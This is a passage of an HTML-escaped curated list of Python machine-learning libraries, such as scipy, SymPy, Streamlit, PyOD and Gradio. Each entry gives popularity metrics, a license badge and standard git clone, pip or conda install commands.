&#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/madgrad&#34;&gt;madgrad&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 760) - MADGRAD Optimization Method. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/madgrad&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2 · 🔀 55 · 📦 25 · 📋 8 - 12% open · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/madgrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/madgrad&#34;&gt;PyPi&lt;/a&gt; (📥 7.6K / month · ⏱️ 08.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install madgrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/achaiah/pywick&#34;&gt;Pywick&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 370 · 💤) - High-level batteries-included neural network training library for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/achaiah/pywick&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 38 · 📦 6 · 📋 14 - 14% open · ⏱️ 22.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/achaiah/pywick&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pywick&#34;&gt;PyPi&lt;/a&gt; (📥 26 / month · ⏱️ 22.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pywick&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 8 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Cadene/pretrained-models.pytorch&#34;&gt;pretrainedmodels&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 8.5K · 💀) - Pretrained ConvNets for pytorch: NASNet, ResNeXt,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lukemelas/EfficientNet-PyTorch&#34;&gt;EfficientNet-PyTorch&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 7K · 💀) - A PyTorch implementation of EfficientNet and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/GRAAL-Research/poutyne&#34;&gt;Poutyne&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 520) - A simplified framework and utilities for PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Luolc/AdaBound&#34;&gt;AdaBound&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 2.9K · 💀) - An optimizer that trains as fast as Adam and as good as SGD. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/adobe/antialiased-cnns&#34;&gt;Antialiased CNNs&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.5K · 💤) - pip install antialiased-cnns to improve stability and.. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=CC%20BY-NC-SA%204.0&#34;&gt;❗️CC BY-NC-SA 4.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lucidrains/lambda-networks&#34;&gt;Lambda Networks&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 1.5K · 💀) - Implementation of LambdaNetworks, a new approach to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/karpathy/micrograd&#34;&gt;micrograd&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 2.1K · 💀) - A tiny scalar-valued autograd engine and a neural net library.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/TorchDrift/TorchDrift&#34;&gt;TorchDrift&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 210 · 💤) - Drift Detection for your PyTorch Models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Database Clients&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for connecting to, operating, and querying databases.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;🔗&amp;nbsp;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-python#database-clients&#34;&gt;best-of-python - DB Clients&lt;/a&gt;&lt;/b&gt; ( ⭐ 2.2K) - Collection of database clients for python.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Others&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scipy/scipy&#34;&gt;scipy&lt;/a&gt;&lt;/b&gt; (🥇49 · ⭐ 9.7K) - Ecosystem of open-source software for mathematics, science, and engineering. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scipy/scipy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.3K · 🔀 4.2K · 📥 350K · 📦 510K · 📋 8.5K - 20% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scipy/scipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scipy&#34;&gt;PyPi&lt;/a&gt; (📥 45M / month · 📦 58K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scipy&#34;&gt;Conda&lt;/a&gt; (📥 23M · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scipy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sympy/sympy&#34;&gt;SymPy&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 9.2K) - A computer algebra system written in pure Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sympy/sympy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.1K · 🔀 3.7K · 📥 450K · 📦 42K · 📋 12K - 35% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sympy/sympy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sympy&#34;&gt;PyPi&lt;/a&gt; (📥 1.7M / month · 📦 4.1K · ⏱️ 20.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sympy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sympy&#34;&gt;Conda&lt;/a&gt; (📥 2.1M · ⏱️ 20.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sympy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/streamlit/streamlit&#34;&gt;Streamlit&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 19K) - Streamlit The fastest way to build data apps in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/streamlit/streamlit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 1.7K · 📦 300 · 📋 2.4K - 23% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/streamlit/streamlit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/streamlit&#34;&gt;PyPi&lt;/a&gt; (📥 990K / month · 📦 370 · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install streamlit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/yzhao062/pyod&#34;&gt;PyOD&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 5.7K) - A Comprehensive and Scalable Python Library for Outlier Detection (Anomaly.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/yzhao062/pyod&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 39 · 🔀 1.1K · 📦 1.3K · 📋 260 - 50% open · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/yzhao062/pyod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyod&#34;&gt;PyPi&lt;/a&gt; (📥 500K / month · 📦 32 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyod&#34;&gt;Conda&lt;/a&gt; (📥 21K · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gradio-app/gradio&#34;&gt;Gradio&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 7.1K) - Wrap UIs around any model, share with anyone. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/gradio-app/gradio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 72 · 🔀 450 · 📦 800 · 📋 690 - 20% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/gradio-app/gradio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gradio&#34;&gt;PyPi&lt;/a&gt; (📥 290K / month · 📦 20 · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gradio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleHub&#34;&gt;PaddleHub&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 8K) - Awesome pre-trained models toolkit based on PaddlePaddle.(300+.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/PaddleHub&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 61 · 🔀 1.6K · 📥 570 · 📦 800 · 📋 1.1K - 40% open · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/PaddleHub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/paddlehub&#34;&gt;PyPi&lt;/a&gt; (📥 15K / month · 📦 5 · ⏱️ 28.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install paddlehub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/simonw/datasette&#34;&gt;Datasette&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 6.1K) - An open source multi-tool for exploring and publishing data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/simonw/datasette&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 63 · 🔀 410 · 📥 39 · 📦 660 · 📋 1.3K - 26% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/simonw/datasette&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/datasette&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 160 · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install datasette&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/datasette&#34;&gt;Conda&lt;/a&gt; (📥 4K · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge datasette&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepchem/deepchem&#34;&gt;DeepChem&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 3.6K) - Democratizing Deep-Learning for Drug Discovery, Quantum Chemistry,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepchem/deepchem&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 190 · 🔀 1.3K · 📦 90 · 📋 1.5K - 31% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepchem/deepchem&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepchem&#34;&gt;PyPi&lt;/a&gt; (📥 7.6K / month · 📦 5 · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepchem&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/deepchem&#34;&gt;Conda&lt;/a&gt; (📥 9.9K · ⏱️ 19.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge deepchem&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/HIPS/autograd&#34;&gt;Autograd&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 5.8K) - Efficiently computes derivatives of numpy code. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/HIPS/autograd&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 51 · 🔀 820 · 📦 3.4K · 📋 390 - 42% open · ⏱️ 08.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/HIPS/autograd&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/autograd&#34;&gt;PyPi&lt;/a&gt; (📥 1.2M / month · 📦 280 · ⏱️ 08.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install autograd&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/autograd&#34;&gt;Conda&lt;/a&gt; (📥 210K · ⏱️ 25.07.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge autograd&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/datalad/datalad&#34;&gt;datalad&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 320) - Keep code, data, containers under control with git and git-annex. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/datalad/datalad&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 47 · 🔀 90 · 📋 3.5K - 13% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/datalad/datalad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/datalad&#34;&gt;PyPi&lt;/a&gt; (📥 7.6K / month · 📦 54 · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install datalad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/datalad&#34;&gt;Conda&lt;/a&gt; (📥 210K · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge datalad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/carla-simulator/carla&#34;&gt;carla&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 7.8K) - Open-source simulator for autonomous driving research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/carla-simulator/carla&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 2.3K · 📦 180 · 📋 3.9K - 14% open · ⏱️ 19.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/carla-simulator/carla&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/carla&#34;&gt;PyPi&lt;/a&gt; (📥 22K / month · 📦 3 · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install carla&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/serge-sans-paille/pythran&#34;&gt;Pythran&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.7K) - Ahead of Time compiler for numeric kernels. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/serge-sans-paille/pythran&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 66 · 🔀 170 · 📦 140 · 📋 760 - 14% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/serge-sans-paille/pythran&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pythran&#34;&gt;PyPi&lt;/a&gt; (📥 330K / month · 📦 14 · ⏱️ 14.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pythran&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pythran&#34;&gt;Conda&lt;/a&gt; (📥 230K · ⏱️ 10.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pythran&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/wireservice/agate&#34;&gt;agate&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.1K · 💤) - A Python data analysis library that is optimized for humans instead of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/wireservice/agate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 140 · 📦 920 · 📋 680 - 7% open · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/wireservice/agate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/agate&#34;&gt;PyPi&lt;/a&gt; (📥 3.4M / month · 📦 130 · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install agate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/agate&#34;&gt;Conda&lt;/a&gt; (📥 83K · ⏱️ 16.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge agate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/inducer/pyopencl&#34;&gt;pyopencl&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 890) - OpenCL integration for Python, plus shiny features. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/inducer/pyopencl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 91 · 🔀 230 · 📦 730 · 📋 310 - 22% open · ⏱️ 21.05.2022):&lt;/p&gt; 